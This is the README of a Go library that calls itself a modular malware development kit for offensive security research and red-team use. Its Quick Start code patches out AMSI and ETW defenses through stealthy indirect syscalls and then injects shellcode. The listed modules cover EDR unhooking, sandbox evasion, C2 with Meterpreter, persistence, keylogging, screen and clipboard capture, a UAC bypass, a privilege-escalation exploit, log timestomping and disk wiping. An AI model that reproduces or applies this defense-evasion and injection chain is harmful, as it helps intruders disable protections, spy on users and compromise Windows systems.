# maldev

Modular malware development library in Go for offensive security research.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

## Quick Start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Create a Caller for stealthy syscalls
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))

// 2. Disable defenses
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

## Documentation

Full documentation is available in the [Wiki](https://github.com/oioio-space/maldev/wiki):
guides, technique references with MITRE ATT&CK mapping, API docs, and composed examples.

## Project Structure

```
maldev/
├── crypto/  encode/  hash/  random/  useragent/         # Layer 0: Pure utilities
├── win/api/  win/syscall/  win/ntapi/  win/token/        # Layer 1: OS primitives
├── win/privilege/  win/impersonate/  win/user/  win/domain/  win/version/
├── evasion/amsi/  evasion/etw/  evasion/unhook/          # Layer 2: Evasion
├── evasion/sleepmask/  evasion/hwbp/  evasion/acg/  evasion/blockdlls/
├── evasion/antidebug/  evasion/antivm/  evasion/sandbox/  evasion/timing/
├── evasion/herpaderping/  evasion/phant0m/
├── inject/                                                # Layer 2: Injection (15+ methods)
├── pe/parse/  pe/srdi/  pe/strip/  pe/bof/  pe/morph/  pe/cert/
├── process/enum/  process/session/
├── system/ads/  system/drive/  system/folder/  system/network/  system/lnk/  system/bsod/  system/ui/
├── c2/shell/  c2/transport/  c2/meterpreter/  c2/cert/   # Layer 3: C2
├── persistence/registry/  persistence/startup/  persistence/scheduler/  persistence/service/
├── collection/keylog/  collection/clipboard/  collection/screenshot/
├── cleanup/selfdelete/  cleanup/memory/  cleanup/service/  cleanup/timestomp/  cleanup/wipe/
├── uacbypass/  exploit/cve202430088/
└── internal/log/  internal/compat/  testutil/  cmd/rshell/
```

## Build

```bash
go build $(go list ./...)       # development build
go test $(go list ./...)        # run tests
GOOS=linux go build $(go list ./...)  # cross-compile
```

Requirements: Go 1.21+ -- no CGO required.

## Acknowledgments

- [D3Ext/maldev](https://github.com/D3Ext/maldev) -- Original inspiration
- [Binject/go-donut](https://github.com/Binject/go-donut) + [TheWover/donut](https://github.com/TheWover/donut) -- PE-to-shellcode (pe/srdi)
- [microsoft/go-winio](https://github.com/microsoft/go-winio) -- ADS concepts (system/ads)

## License

For authorized security research, red team operations, and penetration testing only.
